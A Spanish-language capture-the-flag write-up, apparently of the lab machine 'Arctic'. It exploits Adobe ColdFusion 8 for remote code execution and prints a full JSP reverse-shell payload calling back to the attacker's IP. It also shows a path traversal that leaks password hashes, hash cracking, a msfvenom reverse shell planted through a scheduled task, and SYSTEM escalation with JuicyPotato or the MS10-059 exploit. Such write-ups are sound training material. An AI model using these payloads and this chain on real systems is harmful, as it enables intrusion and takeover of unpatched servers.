---

---
--------------
- Tags: #coldfusion #directory-transversal #password-crack #jsp-malicious #kernel-exploitation #SeImpersonatePrivilege 
---------
## Técnicas utilizadas
- Adobe ColdFusion 8 Exploitation  
- Directory Traversal Vulnerability  
- Cracking Hashes  
- Abusing Scheduled Tasks - Creating malicious JSP file  
- Abusing SeImpersonatePrivilege [Privilege Escalation]
## Procedimiento

![[Pasted image 20240108094430.png]]
### Reconocimiento

Un escaneo con nmap sobre los puertos activos en la maquina nos muestra el siguiente resultado:
```ruby
# Nmap 7.94SVN scan initiated Mon Jan  8 09:50:25 2024 as: nmap -sCV -p135,8500,49154 -oN Ports 10.129.36.166
Nmap scan report for 10.129.36.166
Host is up (0.25s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  8 09:52:55 2024 -- 1 IP address (1 host up) scanned in 150.39 seconds
```

Encontramos una pagina web corriendo en el puerto **8500**, si le lanzamos un **WhatWeb** vemos lo siguiente:
```ruby
# whatweb http://10.129.36.166:8500
http://10.129.36.166:8500 [200 OK] Country[RESERVED][ZZ], maybe Dell-OpenManage-Switch-Administrator, HTTPServer[JRun Web Server], IP[10.129.36.166], Index-Of, Title[Index of /]
```

Al visitar la pagina web, solo vemos dos directorios:
![[Pasted image 20240108095736.png]]

Dentro de la primera carpeta encontramos esta estructura que parece pertenecer a un sitio web:
![[Pasted image 20240108095831.png]]

Una busqueda en google por **CFIDE** nos da la pista de que puede tratarse ColdFusion:
![[Pasted image 20240108095959.png]]
### Adobe ColdFusion 8 Exploitation  

Si buscamos por exploits en google, encontramos un RCE que es para la version 8 de ColdFusion:
![[Pasted image 20240108100816.png]]

Lo descargamos en nuestra maquina para posteriormente modificar estas lineas de codigo para ajustarlas a nuestro caso:
![[Pasted image 20240108101038.png]]

Lo ejecutamos y ya obtendriamos una shell en la maquina victima:
```ruby
# python3 exploit.py

Generating a payload...
Payload size: 1497 bytes
Saved as: fd3868f42475416fa6b58b62a8d39a37.jsp

Priting request...
Content-type: multipart/form-data; boundary=9f93cb0c7f9f409d8287650d81409efc
Content-length: 1698

--9f93cb0c7f9f409d8287650d81409efc
Content-Disposition: form-data; name="newfile"; filename="fd3868f42475416fa6b58b62a8d39a37.txt"
Content-Type: text/plain

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream qG;
    OutputStream i5;

    StreamConnector( InputStream qG, OutputStream i5 )
    {
      this.qG = qG;
      this.i5 = i5;
    }

    public void run()
    {
      BufferedReader tz  = null;
      BufferedWriter xZq = null;
      try
      {
        tz  = new BufferedReader( new InputStreamReader( this.qG ) );
        xZq = new BufferedWriter( new OutputStreamWriter( this.i5 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = tz.read( buffer, 0, buffer.length ) ) > 0 )
        {
          xZq.write( buffer, 0, length );
          xZq.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( tz != null )
          tz.close();
        if( xZq != null )
          xZq.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.204", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--9f93cb0c7f9f409d8287650d81409efc--


Sending request and printing response...


		<script type="text/javascript">
			window.parent.OnUploadCompleted( 0, "/userfiles/file/fd3868f42475416fa6b58b62a8d39a37.jsp/fd3868f42475416fa6b58b62a8d39a37.txt", "fd3868f42475416fa6b58b62a8d39a37.txt", "0" );
		</script>
	

Printing some information for debugging...
lhost: 10.10.14.204
lport: 443
rhost: 10.129.36.166
rport: 8500
payload: fd3868f42475416fa6b58b62a8d39a37.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 443 ...
connect to [10.10.14.204] from (UNKNOWN) [10.129.36.166] 49281

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```
### Directory Traversal Vulnerability  
Aislado al RCE, ColdFusion hay una vulnerabilidad de tipo **Path Traversal** como lo miramos a continuacion:
![[Pasted image 20240108102227.png]]

Al ejecutarlo obtenemos unos hashes(AES) los cuales podremos intentar crackear de manera OFFLINE:
```ruby
# python2 14641.py 10.129.36.166 8500 ../../../../../../../lib/password.properties
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/archives/index.cfm
title from server in /CFIDE/administrator/archives/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /cfide/install.cfm
title from server in /cfide/install.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/entman/index.cfm
title from server in /CFIDE/administrator/entman/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/enter.cfm
title from server in /CFIDE/administrator/enter.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```
### Cracking Hashes  

Obtenemos la contraseña "happyday" del crackeo del hash:
```ruby
# john hash.txt -w=$(locate rockyou.txt | head -n 1)
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)     
1g 0:00:00:00 DONE (2024-01-08 10:19) 100.0g/s 512000p/s 512000c/s 512000C/s happyday..allison1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```
### Abusing Scheduled Tasks - Creating malicious JSP file  

Ahora, con la contraseña, podriamos intentar replicar lo que hace el exploit del **RCE**. Crearemos un **JSP** malicioso para ganar acceso a la maquina.

Creamos el **JSP** con **MsfVenom** de la siguiente manera:
```ruby
# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.204 LPORT=443 -o pwned.jsp
Payload size: 1497 bytes
Saved as: pwned.jsp
```

Con la contraseña que obtuvimos anteriormente, vamos acceder al sitio de administrador que se encuentra en esta dirección:
![[Pasted image 20240108103011.png]]

Una vez dentro, vamos a crear una **Tarea** la cual ejecutara nuestro script:
![[Pasted image 20240108104118.png]]

Aqui, vamos a darle a **Schedule New Task**:
![[Pasted image 20240108104154.png]]

Llenamos el formulario e indicamos nuestro servidor(que vamos a levantar posteriormente para ofrecer el JSP):
![[Pasted image 20240108105322.png]]

Y vemos que se crea correctamente:
![[Pasted image 20240108104605.png]]

Revisando el sevidor web que nos montamos, encontramos una peticion por **GET**:
![[Pasted image 20240108105440.png]]

Como tenemos capacidad de listar directorios, podemos dar con el script malicioso y ejecutarlo desde ahi para recibir una Shell
![[Pasted image 20240108105538.png]]

Al momento de darle click el backend va interpretar el script y nos mandara una shell:
![[Pasted image 20240108105716.png]]
### Abusing SeImpersonatePrivilege [Privilege Escalation]
Listando los privilegios que tenemos como el usuario actualmente en uso, encontramos el tipico #SeImpersonatePrivilege 
![[Pasted image 20240108105753.png]]

Descargaremos **JuicyPotatoe.exe** del repositorio de [antonioCoco](https://github.com/antonioCoco). Posteriormente, vamos a subir el archivo a la maquina:
![[Pasted image 20240108110103.png]]

A la par, vamos a subir **NetCat** para mandarnos una reverse shell como NT Authority:
![[Pasted image 20240108111236.png]]

### Alternativa: Kernel Explotation
Si hacemos un **Systeminfo** vemos que es un kernel demasiado viejo, asi que podriamos intentar explotarlo
```
C:\temp>systeminfo
systeminfo
^[
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 
System Boot Time:          10/1/2024, 5:24:58 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2394 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 4.944 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.091 MB
Virtual Memory: In Use:    1.194 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.20.104
```

Vamos a descargar este exploit especificamente que es para esta [version](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059). Lo subimos a la maquina de igual manera:
![[Pasted image 20240108113648.png]]

Y ejecutamos de la siguiente manera:
```
C:\temp>.\MS10-059.exe 10.10.14.204 443 
.\MS10-059.exe 10.10.14.204 443 
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```

 Por otro lado recibimos la shell:
![[Pasted image 20240108120001.png]]

Estando como NT Authority podriamos leer la flag de root:
![[Pasted image 20240108120237.png]]


